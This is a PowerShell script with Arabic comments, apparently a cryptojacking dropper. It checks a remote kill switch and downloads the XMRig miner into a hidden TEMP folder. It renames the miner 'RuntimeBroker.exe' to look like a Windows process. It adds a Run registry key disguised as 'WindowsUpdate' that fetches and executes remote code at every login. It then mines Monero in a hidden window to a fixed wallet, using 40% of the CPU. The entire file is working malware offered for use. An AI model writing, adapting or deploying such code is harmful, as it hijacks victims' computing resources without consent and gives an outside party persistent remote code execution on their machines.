# win# --- [ 1. الإعدادات والمحفظة ] ---
$W = "44WfpK1StGCS5Te7iyLnSH9oG5Q1zjsKzUMVjt5946HEUEG3ikprw9AHsDq28RjUZtF4AG8gaqiLbS9fYmQans5T1Pu1ccD"
$FakeName = "RuntimeBroker.exe"
$TmpDir = "$env:TEMP\.sys_cache"
$LockFile = "$TmpDir\.lock"
$KillUrl = "https://raw.githubusercontent.com/ZeroSpecterX/mon/main/kill.txt"

# --- [ 2. فحص القتل والهروب ] ---
try {
    $kill = Invoke-WebRequest -Uri $KillUrl -UseBasicParsing -TimeoutSec 2
    if ($kill.Content -match "TERMINATE") {
        Stop-Process -Name ($FakeName.Replace(".exe","")) -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $TmpDir -Recurse -Force -ErrorAction SilentlyContinue
        exit
    }
} catch {}

# منع التكرار
if (Test-Path $LockFile) { exit }
New-Item -ItemType Directory -Force -Path $TmpDir | Out-Null
New-Item -ItemType File -Force -Path $LockFile | Out-Null

# --- [ 3. تحميل وتشغيل المنقب بصمت ] ---
$ZipFile = "$TmpDir\m.zip"
$Url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"

if (!(Test-Path "$TmpDir\$FakeName")) {
    Invoke-WebRequest -Uri $Url -OutFile $ZipFile -UseBasicParsing
    Expand-Archive -Path $ZipFile -DestinationPath $TmpDir -Force
    Move-Item -Path "$TmpDir\xmrig-6.21.0\xmrig.exe" -Destination "$TmpDir\$FakeName" -Force
    Remove-Item -Path $ZipFile, "$TmpDir\xmrig-6.21.0" -Recurse -Force
}
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RegPath -Name "WindowsUpdate" -Value "powershell.exe -w h -c `"iex (iwr -UseBasicParsing https://cdn.jsdelivr.net/gh/ZeroSpecterX/mon/win_mon.ps1)`""

# التشغيل في الخلفية باستهلاك متوسط (40%) وبدون نافذة
Start-Process "$TmpDir\$FakeName" -ArgumentList "-o pool.supportxmr.com:3333 -u $W.Win_$env:COMPUTERNAME -p x -k --donate-level 1 --cpu-max-threads-hint 40" -WindowStyle Hidden
